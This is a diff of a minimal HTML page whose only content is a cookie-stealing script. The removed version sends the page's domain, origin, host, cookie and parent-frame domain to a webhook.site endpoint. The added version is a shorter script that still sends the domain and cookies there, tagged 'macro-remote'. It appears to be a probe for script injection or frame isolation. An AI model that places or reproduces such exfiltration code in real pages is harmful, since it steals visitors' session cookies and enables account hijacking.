@@ -1,19 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-  <script>
-    var domain = document.domain;
-    var origin = location.origin;
-    var host = location.host;
-    
-    fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?domain='+domain+'&origin='+origin+'&host='+host+'&cookie='+document.cookie);
-    
-    try {
-      var parentDomain = window.parent.document.domain;
-      fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?parent='+parentDomain);
-    } catch(e) {
-      fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?parent=blocked&error='+e.message);
-    }
+   <script>
+    fetch('https://webhook.site/76d24c61-64be-4278-8b14-f5de75206a87?from=macro-remote&domain='+document.domain+'&cookie='+document.cookie);
   </script>
 </body>
 </html>
